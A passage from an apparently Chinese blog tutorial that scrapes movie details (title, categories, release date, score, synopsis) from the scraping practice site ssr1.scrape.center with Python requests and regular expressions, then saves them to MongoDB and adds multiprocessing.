print(response)</span><br><br><br><span class="hljs-comment">#3.上映时间</span><br><span class="hljs-comment"># txt = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># &lt;div data-v-7f856186=&quot;&quot; class=&quot;m-v-sm info&quot;&gt;</span><br>                <br><span class="hljs-comment">#                 &lt;span data-v-7f856186=&quot;&quot;&gt;1993-07-26 上映&lt;/span&gt;</span><br>                <br><span class="hljs-comment">#               &lt;/div&gt;</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125; 上映&#x27;)</span><br><span class="hljs-comment"># response = re.search(pattern,txt).group(0).split(&#x27; &#x27;)</span><br><span class="hljs-comment"># print(response[0])</span><br><br><span class="hljs-comment">#评分</span><br><span class="hljs-comment"># txt = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># &lt;div data-v-63864230=&quot;&quot; class=&quot;el-col el-col-24 el-col-xs-8 el-col-sm-4&quot;&gt;&lt;p data-v-63864230=&quot;&quot;</span><br><span class="hljs-comment">#                                                                                         class=&quot;score m-t-md m-b-n-sm&quot;&gt;</span><br><span class="hljs-comment">#               9.5&lt;/p&gt;</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;&lt;p.*?score.*?&gt;(.*?)&lt;/p&gt;&#x27;,re.S)</span><br><span class="hljs-comment"># response = re.search(pattern,txt).group(1).split()</span><br><span class="hljs-comment"># print(response[0])</span><br><br><br><span class="hljs-comment">#剧情简介</span><br>txt = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;div data-v-63864230=&quot;&quot; class=&quot;drama&quot;&gt;&lt;h3 data-v-63864230=&quot;&quot;&gt;剧情简介&lt;/h3&gt;</span><br><span class="hljs-string">                &lt;p data-v-63864230=&quot;&quot;&gt;</span><br><span class="hljs-string">                  影片借一出《霸王别姬》的京戏，牵扯出三个人之间一段随时代风云变幻的爱恨情仇。段小楼（张丰毅 饰）与程蝶衣（张国荣 饰）是一对打小一起长大的师兄弟，两人一个演生，一个饰旦，一向配合天衣无缝，尤其一出《霸王别姬》，更是誉满京城，为此，两人约定合演一辈子《霸王别姬》。但两人对戏剧与人生关系的理解有本质不同，段小楼深知戏非人生，程蝶衣则是人戏不分。段小楼在认为该成家立业之时迎娶了名妓菊仙（巩俐 饰），致使程蝶衣认定菊仙是可耻的第三者，使段小楼做了叛徒，自此，三人围绕一出《霸王别姬》生出的爱恨情仇战开始随着时代风云的变迁不断升级，终酿成悲剧。</span><br><span class="hljs-string">                &lt;/p&gt;&lt;/div&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;div.*?drama.*?&gt;.*?&lt;p.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>response = re.search(pattern,txt).group(<span class="hljs-number">1</span>).strip()<br><span class="hljs-built_in">print</span>(response)<br><br><span class="hljs-comment">#名称</span><br><span class="hljs-comment"># txt = &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># &lt;div data-v-63864230=&quot;&quot; class=&quot;p-h el-col el-col-24 el-col-xs-16 el-col-sm-12&quot;&gt;</span><br><span class="hljs-comment">#               &lt;a data-v-63864230=&quot;&quot;</span><br><span class="hljs-comment">#                  class=&quot;router-link-exact-active router-link-active&quot;&gt;</span><br><span class="hljs-comment">#                 &lt;h2 data-v-63864230=&quot;&quot; class=&quot;m-b-sm&quot;&gt;霸王别姬 - Farewell My Concubine&lt;/h2&gt;&lt;/a&gt;</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># pattern = re.compile(&#x27;&lt;h2.*?m-b-sm.*?&gt;(.*?)&lt;/h2&gt;&#x27;,re.S)</span><br><span class="hljs-comment"># response = re.search(pattern,txt).group(1)</span><br><span class="hljs-comment"># print(response)</span><br></code></pre></td></tr></table></figure><p><strong>实现获取指定页每个电影详情页信息的代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#coding:utf-8</span><br><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> pymongo<br><br><span class="hljs-comment">#1.配置日志</span><br>logging.basicConfig(level=logging.INFO,<br>                    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)<br><br><br>BASE_URL = <span class="hljs-string">&quot;https://ssr1.scrape.center&quot;</span><br>TOTAL_PAGE = <span class="hljs-number">10</span><br><br><span class="hljs-comment">#2.抓取某一列表页面的内容 返回html源码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_index</span>(<span class="hljs-params">page</span>):<br>    index_url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/page/<span class="hljs-subst">&#123;page&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> scrape_page(index_url)<br><br><span class="hljs-comment">#定义函数抓取网页的内容 返回html源码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_page</span>(<span class="hljs-params">url</span>):<br>    logging.info(<span class="hljs-string">&quot;正在抓取 %s......&quot;</span>,url)<br>    <span class="hljs-comment">#发起get请求</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            logging.error(<span class="hljs-string">&quot;爬取%s时返回无效的状态码%s&quot;</span> % (url,response.status_code))<br>    <span class="hljs-keyword">except</span> requests.RequestException:<br>        <span class="hljs-comment">#如果发生异常就报错  </span><br>        <span class="hljs-comment"># exc_info=True用于日志记录异常信息时，会将异常类型 值 回溯信息 堆栈跟踪等都返回</span><br>        logging.error(<span class="hljs-string">&quot;爬取%s发生异常&quot;</span> % url,exc_info=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#解析内容，提取出列表页所有电影的详情页面的url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_index</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则提取详情页面的链接</span><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;a.*href=&quot;(.*?)&quot;.*?class=&quot;name&quot;&gt;&#x27;</span>)<br>    items = re.findall(pattern,html)<br>    <span class="hljs-comment">#print(items)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> items:<br>        <span class="hljs-keyword">return</span> []<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-comment">#把相对链接转为绝对链接</span><br>        detail_url = urljoin(BASE_URL,item)<br>        <span class="hljs-comment">#print(detail_url)</span><br>        logging.info(<span class="hljs-string">&quot;找到详情页，链接%s&quot;</span>%detail_url)<br>        <span class="hljs-comment">#返回一个生成器 可以使用for循环或者调用next()方法遍历生成器对象来提取结果</span><br>        <span class="hljs-keyword">yield</span> detail_url    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_detail</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">return</span> parse_detail(scrape_page(url))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_detail</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则表达式将详情页相应的内容匹配下来</span><br>    <span class="hljs-comment">#图片url 正则</span><br>    img_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;class=&quot;el-col.*?&lt;img.*?src=&quot;(.*?)&quot;.*?class=&quot;cover&quot;&gt;&#x27;</span>,re.S)<br>    img_url = re.search(img_pattern,html).group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">if</span> re.search(img_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#img_url[0]</span><br><br>    <span class="hljs-comment">#类别 正则</span><br>    <span class="hljs-comment">#注意这里要加上re.S  .任意匹配  包括换行符</span><br>    <span class="hljs-comment">#因为.是匹配除了换行符之外的任意字符</span><br>    categories_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;button.*?category.*?&lt;span&gt;(.*?)&lt;/span&gt;.*?&lt;/button&gt;&#x27;</span>,re.S)<br>    categories = re.findall(categories_pattern,html) <span class="hljs-keyword">if</span> re.findall(categories_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment">#上映时间 正则</span><br>    date_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;(\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;)\s?上映&#x27;</span>)<br>    date = re.search(date_pattern,html).group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> re.search(date_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#date[0]</span><br><br>    <span class="hljs-comment">#评分 正则</span><br>    score_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;p.*?score.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>    score = re.search(score_pattern,html).group(<span class="hljs-number">1</span>).split() <span class="hljs-keyword">if</span> re.search(score_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#score[0]  返回的列表</span><br><br>    <span class="hljs-comment">#剧情简介 正则</span><br>    drama_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;div.*?drama.*?&gt;.*?&lt;p.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>    drama = re.search(drama_pattern,html).group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">if</span> re.search(drama_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#drama[0]</span><br><br>    <span class="hljs-comment">#名称 正则</span><br>    name_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;h2.*?m-b-sm.*?&gt;(.*?)&lt;/h2&gt;&#x27;</span>,re.S)<br>    name = re.search(name_pattern,html).group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> re.search(name_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span> <br>    <span class="hljs-comment">#name</span><br>    <br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-comment"># &#x27;image&#x27;:img_url[0],</span><br>        <span class="hljs-comment"># &#x27;categories&#x27;:categories,</span><br>        <span class="hljs-comment"># &#x27;date&#x27;:date[0],</span><br>        <span class="hljs-comment"># &#x27;score&#x27;:score[0],</span><br>        <span class="hljs-comment"># &#x27;drama&#x27;:drama,</span><br>        <span class="hljs-comment"># &#x27;name&#x27;:name</span><br>        <span class="hljs-string">&#x27;image&#x27;</span>:img_url,<br>        <span class="hljs-string">&#x27;categories&#x27;</span>:categories,<br>        <span class="hljs-string">&#x27;date&#x27;</span>:date,<br>        <span class="hljs-string">&#x27;score&#x27;</span>:score[<span class="hljs-number">0</span>],<br>        <span class="hljs-string">&#x27;drama&#x27;</span>:drama,<br>        <span class="hljs-string">&#x27;name&#x27;</span>:name<br>    &#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment">#获取所有电影详情页的链接</span><br>    <span class="hljs-comment"># for page in range(1,TOTAL_PAGE+1):</span><br>    <span class="hljs-comment">#     #抓取某个页面的内容 返回html源码</span><br>    <span class="hljs-comment">#     index_html = scrape_index(page)</span><br>    <span class="hljs-comment">#     #根据源码抓取该页面上跳转详情页的链接</span><br>    <span class="hljs-comment">#     details_urls = parse_index(index_html)</span><br>    <span class="hljs-comment">#     #print(list(details_urls))</span><br>    <span class="hljs-comment">#     logging.info(&quot;详情页面链接%s&quot;,list(details_urls))</span><br><br>    <span class="hljs-comment">#详情页信息爬取测试--第一页</span><br>    <span class="hljs-comment">#获取到第一页的源码</span><br>    index_html = scrape_index(<span class="hljs-number">2</span>)<br>    <span class="hljs-comment">#获取第一页所有电影的详情页的url</span><br>    detail_urls = parse_index(index_html)<br>    <span class="hljs-comment">#爬取每个详情页的信息</span><br>    <span class="hljs-keyword">for</span> detail_url <span class="hljs-keyword">in</span> detail_urls:<br>        data = scrape_detail(detail_url)<br>        logging.info(<span class="hljs-string">&quot;get detail data %s&quot;</span> % data)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230930190440051.png" alt="image-20230930190440051"></p><h3 id="第三步-存入数据库（mongodb）-多线程"><a href="#第三步-存入数据库（mongodb）-多线程" class="headerlink" title="第三步 存入数据库（mongodb）+多线程"></a>第三步 存入数据库（mongodb）+多线程</h3><p>centos7安装mongodb3.6以上</p><p><a href="https://www.cnblogs.com/lone5wolf/p/10855985.html">CentOS7下安装配置Mongodb3.6 - #独狼 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/zhao_5352269/article/details/82151173">Cenos7 yum安装mongodb以及各种错误的解决办法-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/449833439">Linux Centos 7安装MongoDB（简单！详细！） - 知乎 (zhihu.com)</a></p><p><img src="/img/image-20230930201309769.png" alt="image-20230930201309769"></p><p>下载mongodb compass（gui工具）  Documents显示有问题（版本原因）</p><p><a href="https://www.mongodb.com/try/download/compass">MongoDB Compass Download (GUI) | MongoDB</a></p><h4 id="存入mongodb"><a href="#存入mongodb" class="headerlink" title="存入mongodb"></a>存入mongodb</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#创建mongodb客户端</span><br>mongo_client = pymongo.MongoClient(<span class="hljs-string">&quot;mongodb://10.210.100.131:27017/&quot;</span>)<br><span class="hljs-comment">#创建数据库</span><br>db = mongo_client[<span class="hljs-string">&#x27;r1_movies&#x27;</span>]<br>collection = db[<span class="hljs-string">&#x27;movies&#x27;</span>]<br><br><span class="hljs-comment">#保存数据到mongodb 使用时调用此函数即可</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_data</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment">#插入数据</span><br>    collection.insert_one(data)<br>    logging.info(<span class="hljs-string">&quot;数据保存到mongodb成功！！！&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/img/image-20230930201234040.png" alt="image-20230930201234040" style="zoom:67%;" /><p><img src="/img/image-20230930201813980.png" alt="image-20230930201813980"></p><h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#coding:utf-8</span><br><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> pymongo<br><span class="hljs-keyword">import</span> multiprocessing<br><br><span class="hljs-comment">#创建mongodb客户端</span><br>mongo_client = pymongo.MongoClient(<span class="hljs-string">&quot;mongodb://10.210.100.131:27017/&quot;</span>)<br><span class="hljs-comment">#创建数据库</span><br>db = mongo_client[<span class="hljs-string">&#x27;r1_movies&#x27;</span>]<br>collection = db[<span class="hljs-string">&#x27;movies&#x27;</span>]<br><br><span class="hljs-comment">#1.配置日志</span><br>logging.basicConfig(level=logging.INFO,<br>                    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)<br><br><br>BASE_URL = <span class="hljs-string">&quot;https://ssr1.scrape.center&quot;</span><br>TOTAL_PAGE = <span class="hljs-number">10</span><br><br><span class="hljs-comment">#2.抓取某一列表页面的内容 返回html源码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_index</span>(<span class="hljs-params">page</span>):<br>    index_url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/page/<span class="hljs-subst">&#123;page&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> scrape_page(index_url)<br><br><span class="hljs-comment">#定义函数抓取网页的内容 返回html源码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_page</span>(<span class="hljs-params">url</span>):<br>    logging.info(<span class="hljs-string">&quot;正在抓取 %s......&quot;</span>,url)<br>    <span class="hljs-comment">#发起get请求</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            logging.error(<span class="hljs-string">&quot;爬取%s时返回无效的状态码%s&quot;</span> % (url,response.status_code))<br>    <span class="hljs-keyword">except</span> requests.RequestException:<br>        <span class="hljs-comment">#如果发生异常就报错  </span><br>        <span class="hljs-comment"># exc_info=True用于日志记录异常信息时，会将异常类型 值 回溯信息 堆栈跟踪等都返回</span><br>        logging.error(<span class="hljs-string">&quot;爬取%s发生异常&quot;</span> % url,exc_info=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#解析内容，提取出列表页所有电影的详情页面的url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_index</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则提取详情页面的链接</span><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;a.*href=&quot;(.*?)&quot;.*?class=&quot;name&quot;&gt;&#x27;</span>)<br>    items = re.findall(pattern,html)<br>    <span class="hljs-comment">#print(items)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> items:<br>        <span class="hljs-keyword">return</span> []<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-comment">#把相对链接转为绝对链接</span><br>        detail_url = urljoin(BASE_URL,item)<br>        <span class="hljs-comment">#print(detail_url)</span><br>        logging.info(<span class="hljs-string">&quot;找到详情页，链接%s&quot;</span>%detail_url)<br>        <span class="hljs-comment">#返回一个生成器 可以使用for循环或者调用next()方法遍历生成器对象来提取结果</span><br>        <span class="hljs-keyword">yield</span> detail_url    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_detail</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">return</span> parse_detail(scrape_page(url))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_detail</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则表达式将详情页相应的内容匹配下来</span><br>    <span class="hljs-comment">#图片url 正则</span><br>    img_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;class=&quot;el-col.*?&lt;img.*?src=&quot;(.*?)&quot;.*?class=&quot;cover&quot;&gt;&#x27;</span>,re.S)<br>    img_url = re.search(img_pattern,html).group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">if</span> re.search(img_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#img_url[0]</span><br><br>    <span class="hljs-comment">#类别 正则</span><br>    <span class="hljs-comment">#注意这里要加上re.S  .任意匹配  包括换行符</span><br>    <span class="hljs-comment">#因为.是匹配除了换行符之外的任意字符</span><br>    categories_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;button.*?category.*?&lt;span&gt;(.*?)&lt;/span&gt;.*?&lt;/button&gt;&#x27;</span>,re.S)<br>    categories = re.findall(categories_pattern,html) <span class="hljs-keyword">if</span> re.findall(categories_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment">#上映时间 正则</span><br>    date_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;(\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;)\s?上映&#x27;</span>)<br>    date = re.search(date_pattern,html).group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> re.search(date_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#date[0]</span><br><br>    <span class="hljs-comment">#评分 正则</span><br>    score_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;p.*?score.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>    score = re.search(score_pattern,html).group(<span class="hljs-number">1</span>).split() <span class="hljs-keyword">if</span> re.search(score_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#score[0]  返回的列表</span><br><br>    <span class="hljs-comment">#剧情简介 正则</span><br>    drama_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;div.*?drama.*?&gt;.*?&lt;p.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>    drama = re.search(drama_pattern,html).group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">if</span> re.search(drama_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#drama[0]</span><br><br>    <span class="hljs-comment">#名称 正则</span><br>    name_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;h2.*?m-b-sm.*?&gt;(.*?)&lt;/h2&gt;&#x27;</span>,re.S)<br>    name = re.search(name_pattern,html).group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> re.search(name_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span> <br>    <span class="hljs-comment">#name</span><br>    <br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-comment"># &#x27;image&#x27;:img_url[0],</span><br>        <span class="hljs-comment"># &#x27;categories&#x27;:categories,</span><br>        <span class="hljs-comment"># &#x27;date&#x27;:date[0],</span><br>        <span class="hljs-comment"># &#x27;score&#x27;:score[0],</span><br>        <span class="hljs-comment"># &#x27;drama&#x27;:drama,</span><br>        <span class="hljs-comment"># &#x27;name&#x27;:name</span><br>        <span class="hljs-string">&#x27;image&#x27;</span>:img_url,<br>        <span class="hljs-string">&#x27;categories&#x27;</span>:categories,<br>        <span class="hljs-string">&#x27;date&#x27;</span>:date,<br>        <span 